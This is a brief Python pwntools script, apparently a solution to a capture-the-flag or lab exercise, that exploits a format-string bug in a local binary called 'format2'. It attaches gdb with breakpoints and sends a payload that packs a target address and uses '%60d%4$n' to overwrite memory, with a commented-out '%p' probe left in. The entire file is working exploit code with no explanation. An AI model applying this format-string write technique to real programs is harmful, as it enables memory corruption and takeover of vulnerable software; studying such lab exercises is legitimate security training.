from pwn import *


BINARY = "../bin/./format2"
r = process(BINARY)
gdb.attach(r,'''
break *0x08048485
break * 0x80484BA
c
''')
#payload="AAAA"+".%p"*10
payload="\xe4\x96\x04\x08%60d%4$n"
r.sendline(payload)
r.interactive()
